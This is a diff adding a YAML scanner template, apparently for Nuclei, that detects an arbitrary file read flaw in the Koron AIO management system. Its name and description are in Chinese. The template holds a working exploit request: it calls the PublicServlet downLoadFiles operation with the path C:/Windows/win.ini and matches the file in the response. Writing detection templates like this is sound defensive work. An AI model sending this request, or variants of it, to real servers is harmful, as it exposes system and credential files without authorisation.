@@ -1,0 +1,37 @@
+id: koron-aio-publicservlet-anyfile-read
+
+info:
+  name: 科荣 AIO管理系统 PublicServlet 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    科荣 AIO 管理系统存在一个任意文件读取漏洞。攻击者可以通过指定文件路径读取服务器上的任意文件。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/PublicServlet?operation=downLoadFiles&path=C:/Windows/win.ini&pho="
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "win.ini"
+        part: body
+      - type: word
+        words:
+          - "filename=files.rar"
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
